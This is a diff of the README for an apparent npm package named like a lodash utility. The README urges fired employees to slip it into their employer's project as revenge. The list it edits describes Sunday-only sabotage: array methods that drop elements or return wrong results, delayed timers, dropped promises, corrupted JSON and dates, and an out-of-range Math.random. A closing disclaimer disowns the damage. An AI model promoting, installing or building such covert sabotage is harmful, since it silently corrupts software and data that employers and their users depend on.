@@ -30,7 +30,7 @@ $ npm i lodash-utils
 
 ---
 
-I heard you're fired by your company.
+Your company is getting rid of your even you have done nothing wrong?
 
 Wanna leave a little *surprise* for the project you are working on?
 
@@ -38,15 +38,15 @@ Try include this *harmless* library! Your project will have following amazing ef
 
 When on Sunday:
 
-* If the array size is divisible by `7`, `Array.includes` aways return `false`.
-* `Array.map` has 5% chance to  drop the last element.
-* `Array.filter` has 5% chance to drop the final element.
-* `Array.forEach` will will cause a significant lag.
-* `setTimeout` will alway trigger 1s later than expected.
+* If the array size is divisible by `7`, `Array.includes` will aways return `false`.
+* `Array.map` has 5% chance to drop the last element.
+* `Array.filter` has 5% chance to drop the last element.
+* `Array.forEach` will cause a significant lag.
+* `setTimeout` will always trigger 1s later than expected.
 * `Promise.then` has 10% chance will not register.
-* `JSON.stringify` has 30% replace `I` into `l`.
-* `Date.getTime()` always gives the result off by 1 hour.
-* `localStorage.getItem` has 5% chance returns empty string.
+* `JSON.stringify` has 30% chance to replace all `I` into `l`.
+* `Date.getTime()` always gives the result off by 1 hour late.
+* `localStorage.getItem` has 5% chance to return empty string.
 * The possible range of `Math.random()` is changed to `0` - `1.1`.
 
 **Disclaimer: The author of this library does not inject the code. Any damage caused by injecting this library has nothing to do with the author.**
